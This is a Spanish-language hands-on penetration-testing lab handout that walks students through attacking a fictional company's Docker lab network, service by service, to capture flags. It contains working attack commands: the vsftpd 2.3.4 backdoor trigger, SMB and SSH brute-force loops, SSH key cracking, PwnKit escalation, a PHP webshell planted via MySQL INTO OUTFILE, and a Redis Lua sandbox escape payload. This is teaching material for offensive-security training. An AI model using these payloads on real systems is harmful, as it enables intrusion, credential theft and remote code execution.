# Clase 04 · Explotación de Servicios
### Inversiones Qhapaq SAC — de "puerto abierto" a "root"

> **Duración:** 4 horas (240 min) · **Modalidad:** full práctica.
> **Entorno:** Docker **dentro de tu Kali** (VM o WSL), red `10.40.0.0/24`.
> **Lo que viste en clases previas** te dio credenciales y pistas; **hoy las usas para entrar.**
>
> ⚖️ **Ética:** todo esto es legal **solo** contra este laboratorio o un alcance autorizado por
> escrito. En la vida real, sin autorización es delito (Ley 30096, art. 2; exención art. 12).

---

## Agenda

| Bloque | Tiempo | Tema |
|---|---|---|
| Teoría exprés | 15 | Del reconocimiento a la explotación · el ciclo |
| Lab 0 | 10 | Levantar el entorno |
| Lab 1 | 45 | **El gimnasio de NMAP** (host `.5`) |
| Lab 2 | 30 | FTP: versión → CVE → shell (host `.21`) |
| — | 10 | **Pausa** |
| Lab 3 | 35 | SMB: credenciales débiles y botín (host `.45`) |
| Lab 4 | 35 | SSH: fuerza bruta dirigida + llave robada (host `.22`) |
| Lab 5 | 35 | MySQL → webshell y Redis (hosts `.33` y `.63`) |
| Lab 6 | 15 | RDP + MSSQL (hosts `.38` / `.14`, opcional) |
| Cierre | 10 | Metasploit vs. manual · entrega |

**Meta mínima de hoy:** banderas 11 a 19. Las 20–22 son "para los más pros".

---

## Teoría exprés (15 min)

Un servicio expuesto se explota en **4 pasos**, siempre los mismos:

1. **Descubrir** el puerto → `nmap`
2. **Identificar** el software y su **versión exacta** → `nmap -sV`
3. **Buscar la falla**: un CVE de esa versión, una credencial débil, o una mala configuración
4. **Explotar**: a mano (aprendes) o con Metasploit (automatizas)

Las tres fuentes de acceso que verás hoy:
- **CVE** (software viejo sin parche) → FTP, Redis, pkexec
- **Credenciales débiles** (fuerza bruta dirigida) → SSH, SMB, RDP
- **Mala configuración** (permisos de más) → MySQL `FILE`, `secure_file_priv` vacío

> **Diccionario dirigido:** no uses `rockyou` a ciegas. Usa lo que descubriste: la política
> "Empresa+Año+símbolo" de la Clase 03 genera un diccionario de 150 palabras que **sí** entra,
> en segundos, en vez de 14 millones que tardarían horas.

---

## Lab 0 · Levantar el entorno (10 min)

> Recuerda: **Docker corre dentro de Kali** (no Docker Desktop de Windows), o las IPs del
> laboratorio no se alcanzan. En Kali WSL, como root: `service docker start`.

```bash
# 1. Verifica tu entorno
cd Clase-04
chmod +x scripts/00-verificar-entorno.sh
./scripts/00-verificar-entorno.sh

# 2. Construye y levanta la red (la primera vez tarda, descarga paquetes)
cd objetivo
docker compose up -d --build

# 3. Confirma que los 7 contenedores están arriba
docker compose ps
```

Deberías ver `qs-fw qs-ftp qs-ssh qs-db qs-rdp qs-files qs-cache` en estado *Up*.

```bash
# 4. ¿Quién está vivo?  (desde Kali, no desde dentro del contenedor)
nmap -sn 10.40.0.0/24
```

> **Mapa de la red** · `.5` firewall/gateway · `.21` FTP · `.22` SSH · `.33` DB+web ·
> `.38` RDP · `.45` archivos · `.63` caché Redis. El host `.14` (MSSQL) es opcional.

---

## Lab 1 · El gimnasio de NMAP (45 min) — host `.5`

El `.5` no tiene vulnerabilidades: es un **campo de tiro** para que domines nmap.
Ten abierto el **`recetario-nmap.md`** al lado.

### 1.1 — Los cinco estados de un puerto
```bash
nmap -Pn -p 22,80,443,3306,8080,9999 --reason 10.40.0.5
```
Anota en tu bitácora **qué estado** sale en cada puerto y, con `--reason`, **por qué**:
- 80, 22 → `open` (syn-ack)
- 443 → `closed` (reset)
- 3306 → `filtered` (icmp port-unreachable)
- 8080, 9999 → `filtered` (no-response)

> ❓ *Pregunta:* ¿por qué 443 sale "closed" y 8080 "filtered", si ninguno tiene servicio?
> (Pista: uno **rechaza** con reset, el otro **traga** el paquete en silencio.)

### 1.2 — Mapear el firewall con ACK scan
```bash
sudo nmap -sA -p 22,80,443,8080,9999 --reason 10.40.0.5
```
El ACK no dice "abierto", dice si el **firewall deja pasar** (`unfiltered`) o no (`filtered`).

### 1.3 — El host que no responde ping
```bash
nmap -sn -PE 10.40.0.5          # "host down" → el ICMP echo está bloqueado
nmap -sn -PS80 10.40.0.5        # por TCP SYN sí aparece
```

### 1.4 — Lo que vive en UDP (¡casi nadie lo mira!)
```bash
sudo nmap -sU --top-ports 50 --reason 10.40.0.5
```
Encontrarás **69/udp (TFTP)**. Bájate el respaldo del router, sin usuario ni clave:
```bash
tftp 10.40.0.5 -c get config-router.txt
cat config-router.txt      # 🚩 bandera 11
```

### 1.5 — El puerto que solo confía en el "DNS"
Viste que el 9999 sale `filtered`. Pero el firewall lo abre si el tráfico **parece venir de DNS**:
```bash
sudo nmap -sS -g 53 -p 9999 --reason 10.40.0.5     # ahora: open
```
Conéctate forzando puerto de origen 53 y lee el panel:
```bash
sudo nc -p 53 10.40.0.5 9999        # 🚩 bandera 12
```

> 🎯 **Banderas 11 y 12.** Lección: *filtered no es seguro; es "no me respondió a ESTE sondeo".*

---

## Lab 2 · FTP: de la versión al shell (30 min) — host `.21`

### 2.1 — Identifica la versión exacta
```bash
nmap -sV -p 21 10.40.0.21
```
Sale **vsftpd 2.3.4**. Esa versión concreta tiene una historia negra.

### 2.2 — Confírmalo con NSE
```bash
nmap -p 21 --script ftp-vsftpd-backdoor 10.40.0.21
```
`VULNERABLE: CVE-2011-2523`. En 2011 alguien troyanizó el código fuente: si el **usuario**
contiene `:)`, se abre una shell de root en el puerto **6200**.

### 2.3 — Dispara la puerta trasera **a mano** (para entender cómo funciona)
```bash
# Terminal 1: manda un usuario con la carita :)
nc 10.40.0.21 21
USER pentester:)
PASS loquesea
# (déjalo abierto)

# Terminal 2: conéctate al backdoor que se acaba de abrir
nc 10.40.0.21 6200
id
cat /root/flag.txt        # 🚩 bandera 13
```

### 2.4 — Ahora con Metasploit (la forma automática)
```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.40.0.21
run
# shell de root directa; compara el esfuerzo con hacerlo a mano
```

> 🎯 **Bandera 13.** Lección: la **versión** es tu llave; `searchsploit vsftpd 2.3.4` te da el exploit.

---

## ☕ Pausa (10 min)

---

## Lab 3 · SMB: credenciales débiles y botín (35 min) — host `.45`

### 3.1 — Enumera el servicio
```bash
nmap -p 445 --script smb-protocols,smb2-security-mode 10.40.0.45
smbclient -L //10.40.0.45 -N        # sesión nula: ves "publico" y "ti"
```
La carpeta `ti` pide usuario. En la Clase 03 descubriste usuarios (jdiaz, mquispe, rhuaman,
soporte, gerencia) y la política de contraseñas **"Empresa+Año+símbolo"**.

### 3.2 — Construye el diccionario dirigido
```bash
printf 'jdiaz\nmquispe\nrhuaman\nsoporte\ngerencia\n' > usuarios.txt
for b in Qhapaq qhapaq QHAPAQ; do for y in $(seq 2020 2026); do
  for s in '!' '@' '#' '$' '%' '*' '.'; do echo "$b$y$s"; done; done; done > dicc.txt
wc -l dicc.txt      # ~147 claves, no millones
```

### 3.3 — Fuerza bruta contra SMB (a mano, con un bucle)
```bash
while read -r u; do while read -r p; do
  smbclient //10.40.0.45/ti -U "$u%$p" -c 'ls' >/dev/null 2>&1 && echo "VALIDA → $u : $p"
done < dicc.txt; done < usuarios.txt
```
Encuentra `mquispe : Qhapaq2025!`.

### 3.4 — Saquea el recurso
```bash
smbclient //10.40.0.45/ti -U 'mquispe%Qhapaq2025!' \
  -c 'recurse ON; prompt OFF; mget *'
ls -R
cat flag.txt                     # 🚩 bandera 14
cat config/erp-db.conf           # credenciales de la base de datos → Lab 5
cat respaldos/id_ed25519_deploy  # ¡una llave SSH privada! → Lab 4
```

> 🎯 **Bandera 14.** Te llevas **dos tesoros**: la clave de MySQL y una llave SSH.

---

## Lab 4 · SSH: fuerza bruta + llave robada (35 min) — host `.22`

### 4.1 — Enumera
```bash
nmap -sV -p 22 10.40.0.22
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=rhuaman" 10.40.0.22
```
Acepta **password** y **publickey**. Dos caminos de entrada.

### 4.2 — Camino A: fuerza bruta dirigida con Hydra
```bash
# reusa usuarios.txt y dicc.txt del Lab 3
hydra -L usuarios.txt -P dicc.txt -t 4 ssh://10.40.0.22
```
Entra `rhuaman : Qhapaq2024#`.
```bash
ssh rhuaman@10.40.0.22
cat flag.txt            # 🚩 bandera 15
```

### 4.3 — Camino B: la llave SSH que robaste del SMB
La llave está cifrada con passphrase. Crackéala con John:
```bash
cd ~/botin   # donde bajaste la llave
cp respaldos/id_ed25519_deploy deploy.key && chmod 600 deploy.key
ssh2john deploy.key > deploy.hash
john --wordlist=/usr/share/wordlists/rockyou.txt deploy.hash
john --show deploy.hash          # passphrase: superman
```
Entra con la llave:
```bash
ssh -i deploy.key deploy@10.40.0.22
cat flag.txt            # 🚩 bandera 16
```

### 4.4 — (Pros) Escalar a root con PwnKit
El sistema es un Ubuntu 20.04 sin parchar. Mira la versión de polkit:
```bash
dpkg -l policykit-1        # 0.105-26ubuntu1  → CVE-2021-4034
ls -l /usr/bin/pkexec      # SUID root
```
Descarga y compila el exploit público (berdav/PwnKit) o usa Metasploit:
```bash
# Metasploit (necesita una sesión previa en la máquina)
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
# … obtendrás uid=0 → cat /root/flag.txt  🚩 bandera 17
```

> 🎯 **Banderas 15, 16, 17.** Lección: una misma llave reutilizada + un binario SUID viejo = root.

---

## Lab 5 · MySQL → webshell y Redis (35 min) — hosts `.33` y `.63`

### 5.1 — MySQL con la credencial del `erp-db.conf`
```bash
nmap -sV -p 3306,8080 10.40.0.33
mysql -h 10.40.0.33 -u webapp -p'W3bApp#2023'
```
Dentro:
```sql
SHOW DATABASES;
SELECT valor FROM qhapaq_erp.flags;      -- 🚩 bandera 18
SHOW GRANTS;                             -- fíjate: tienes el privilegio FILE
SELECT @@secure_file_priv;               -- vacío = puedes escribir donde quieras
```

### 5.2 — De SQL a webshell con `INTO OUTFILE`
El Apache del `.33` corre en el 8080 y su carpeta `/uploads` es escribible por MySQL:
```sql
SELECT '<?php system($_GET[0]); ?>' INTO OUTFILE '/var/www/html/uploads/sh.php';
```
```bash
# desde Kali, ejecuta comandos a través de la webshell
curl "http://10.40.0.33:8080/uploads/sh.php?0=id;cat+/var/www/flag-rce.txt"   # 🚩 bandera 19
```

### 5.3 — (Pros) Redis sin autenticación
```bash
nmap -p- 10.40.0.63                 # el 6379 NO está en el top-1000: usa -p-
nmap -p 6379 --script redis-info 10.40.0.63   # versión 5.0.7 → CVE-2022-0543
redis-cli -h 10.40.0.63 ping        # responde sin pedir clave
```
Escapa del sandbox de Lua para ejecutar comandos del sistema:
```bash
redis-cli -h 10.40.0.63 EVAL 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0","luaopen_io"); local io = io_l(); local f = io.popen("id; cat /var/lib/redis/flag.txt","r"); local r = f:read("*a"); f:close(); return r' 0
# 🚩 bandera 21
```

> 🎯 **Banderas 18, 19 (y 21).** Lección: una credencial filtrada + un privilegio de más
> (FILE) convierte una base de datos en ejecución remota de comandos.

---

## Lab 6 · RDP y MSSQL (15 min, opcional) — hosts `.38` / `.14`

### 6.1 — RDP del gerente
En la base de datos (Lab 5) viste la tabla `accesos_remotos` con la clave de `gerencia`.
```bash
nmap -p 3389 --script rdp-enum-encryption 10.40.0.38
# desde Kali con un cliente gráfico:
xfreerdp /v:10.40.0.38 /u:gerencia /p:'Gerencia#2025' /cert:ignore
# el escritorio muestra la bandera 20
```

### 6.2 — MSSQL (si el instructor levantó el perfil `mssql`)
```bash
nmap -p 1433 --script ms-sql-info 10.40.0.14
# 'sa' sigue la política de contraseñas → bandera 22
```

---

## Cierre y entrega (10 min)

**Reflexión — manual vs. Metasploit:** hoy hiciste lo mismo de las dos formas (vsftpd a mano
y con `msfconsole`). Metasploit es rápido, pero si no entiendes **qué** hace por debajo, no
sabrás improvisar cuando falle. Aprende a mano; automatiza después.

**Entrega — una bitácora** (usa `plantillas/bitacora-explotacion.md`) con, por cada host:
- comando nmap con el que lo encontraste (+ `date -Is`)
- servicio y versión
- cómo era la falla (CVE / credencial / configuración)
- evidencia de acceso (`id`, contenido de la bandera) con **hora**

> Se evalúa la **bitácora con evidencia y hora**, no la bandera suelta (las banderas están en
> el código fuente del laboratorio; cualquiera las copiaría; nos interesa que demuestres el *cómo*).

**La cadena completa de hoy, de un vistazo:**
```
.5  firewall  → estados de puerto + TFTP(UDP) + truco -g 53
.21 vsftpd 2.3.4 → CVE-2011-2523 → root del FTP
.45 SMB      → fuerza bruta dirigida → llave SSH + clave MySQL
.22 SSH      → clave reusada / llave crackeada → deploy → PwnKit → root
.33 MySQL    → FILE + INTO OUTFILE → webshell www-data
.63 Redis    → escape de Lua → ejecución de comandos
.38 RDP      → credencial reciclada de la base de datos
```

**Para la próxima clase (05 · Web y APIs):** guarda la webshell del `.33` y la credencial
`webapp`. Empezaremos a atacar la **aplicación** del ERP, no solo el servicio.
